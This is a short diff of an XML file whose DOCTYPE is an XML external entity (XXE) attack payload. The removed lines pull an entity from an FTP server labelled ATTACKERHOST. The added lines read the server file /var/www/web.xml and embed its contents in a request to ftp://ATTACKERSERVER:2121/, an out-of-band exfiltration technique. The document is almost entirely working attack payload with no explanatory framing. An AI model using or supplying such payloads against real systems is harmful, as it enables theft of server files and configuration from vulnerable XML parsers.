@@ -1,8 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [   
-  <!ENTITY % one SYSTEM "ftp://ATTACKERHOST:2121/">
-  %one;
-  %two;
-  %four;
-  %five;
+  <!ENTITY % d SYSTEM "file:///var/www/web.xml"> 
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://ATTACKERSERVER:2121/%d;'>">
 ]>
